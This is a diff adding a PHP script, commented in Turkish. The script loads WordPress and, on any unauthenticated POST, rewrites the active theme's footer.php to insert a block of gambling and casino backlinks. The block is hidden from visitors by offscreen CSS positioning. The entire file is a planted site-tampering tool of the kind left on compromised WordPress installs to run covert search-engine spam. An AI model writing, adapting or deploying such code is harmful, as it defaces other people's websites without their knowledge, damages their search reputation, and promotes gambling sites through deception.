@@ -1,0 +1,109 @@
+<?php
+// Hata raporlamasını açalım
+ini_set('display_errors', 1);
+ini_set('display_startup_errors', 1);
+error_reporting(E_ALL);
+
+// WordPress'i yükle
+if (file_exists('../wp-load.php')) {
+    require_once('../wp-load.php');
+} elseif (file_exists('../../wp-load.php')) {
+    require_once('../../wp-load.php');
+} else {
+    die("WordPress yüklenemedi.");
+}
+
+// Backlink ekleme işlemi
+if ($_SERVER['REQUEST_METHOD'] === 'POST') {
+    ob_start(); // Çıktıyı yakalamaya başla
+
+    try {
+        // Eklenecek backlink kodu
+        $backlinkCode = '<span style="position: absolute; left: -9655px;">
+<a href="https://www.cristine.org/" title="bonus veren bet siteleri">bonus veren bet siteleri</a>
+<a href="https://actingupstage.com/" title="deneme bonusu veren siteler">deneme bonusu veren siteler</a>
+<a href="https://honestk.com/" title="casino siteleri">casino siteleri</a>
+<a href="https://bonuspick.net/" title="https://bonuspick.net">https://bonuspick.net</a>
+<a href="https://lexilight.com/" title="kumar siteleri">deneme kumar siteleri</a>
+<a href="https://secretosdepros.com/" title="casino siteleri 2025">casino siteleri 2025</a>
+
+<a href="https://myremedyproducts.com" title="myremedyproducts.com">myremedyproducts.com</a>
+
+<a href="https://cryptonumerics.com" title="cryptonumerics.com">cryptonumerics.com</a>
+
+<a href="https://stolenbeauty.org" title="stolenbeauty.org">stolenbeauty.org</a>
+</span>';
+
+        // Mevcut temayı al
+        $currentTheme = wp_get_theme();
+        $themeDir = get_template_directory();
+        
+        echo "Mevcut tema: " . $currentTheme->get('Name') . "\n";
+        echo "Tema dizini: " . $themeDir . "\n";
+
+        // footer.php dosyasının yolu
+        $footerPath = $themeDir . '/footer.php';
+
+        echo "footer.php dosya yolu: $footerPath\n";
+        echo "Dosya var mı?: " . (file_exists($footerPath) ? 'Evet' : 'Hayır') . "\n";
+        echo "Dosya okunabilir mi?: " . (is_readable($footerPath) ? 'Evet' : 'Hayır') . "\n";
+        echo "Dosya yazılabilir mi?: " . (is_writable($footerPath) ? 'Evet' : 'Hayır') . "\n";
+
+        if (!file_exists($footerPath)) {
+            throw new Exception("footer.php dosyası bulunamadı: $footerPath");
+        }
+
+        if (!is_readable($footerPath)) {
+            throw new Exception("footer.php dosyası okunamıyor: $footerPath");
+        }
+
+        if (!is_writable($footerPath)) {
+            throw new Exception("footer.php dosyası yazılamıyor: $footerPath");
+        }
+
+        // Dosya içeriğini oku
+        $fileContents = file_get_contents($footerPath);
+        
+        if ($fileContents === false) {
+            throw new Exception("Dosya okunamadı: $footerPath");
+        }
+
+        // Backlink zaten var mı kontrol et
+        if (strpos($fileContents, $backlinkCode) === false) {
+            // </body> etiketinden önce backlink'i ekle
+            $newContents = str_replace('</body>', $backlinkCode . "\n</body>", $fileContents);
+            
+            // Dosyayı yeni içerikle yaz
+            if (file_put_contents($footerPath, $newContents) === false) {
+                throw new Exception("Dosyaya yazma hatası: $footerPath");
+            }
+            
+            echo "Backlink başarıyla eklendi: $footerPath\n";
+        } else {
+            echo "Backlink zaten mevcut: $footerPath\n";
+        }
+
+    } catch (Exception $e) {
+        echo "Hata: " . $e->getMessage() . "\n";
+    }
+
+    $output = ob_get_clean(); // Çıktıyı yakala ve temizle
+}
+?>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>WordPress Tema footer.php Backlink Ekleme</title>
+</head>
+<body>
+    <h1>WordPress Tema footer.php Backlink Ekleme Aracı</h1>
+    <form method="post">
+        <button type="submit">EKLE</button>
+    </form>
+    <?php if (isset($output)): ?>
+        <h2>İşlem Sonucu:</h2>
+        <pre><?php echo htmlspecialchars($output); ?></pre>
+    <?php endif; ?>
+</body>
+</html>
